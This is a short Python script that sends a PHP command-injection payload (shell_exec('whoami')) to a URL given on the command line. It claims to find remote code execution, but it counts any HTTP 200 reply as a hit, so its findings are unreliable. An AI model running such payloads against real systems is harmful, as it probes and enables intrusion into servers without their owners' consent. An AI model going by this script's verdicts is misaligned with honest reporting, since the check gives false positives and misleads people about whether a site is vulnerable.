import requests
import sys

def test_rce(url):
    payload = "<?php echo shell_exec('whoami'); ?>"
    response = requests.post(url, data={'cmd': payload})
    if response.status_code == 200:
        print(f"RCE vulnerability found at: {url}")
    else:
        print("No RCE vulnerability found.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python rce_test.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    test_rce(url)
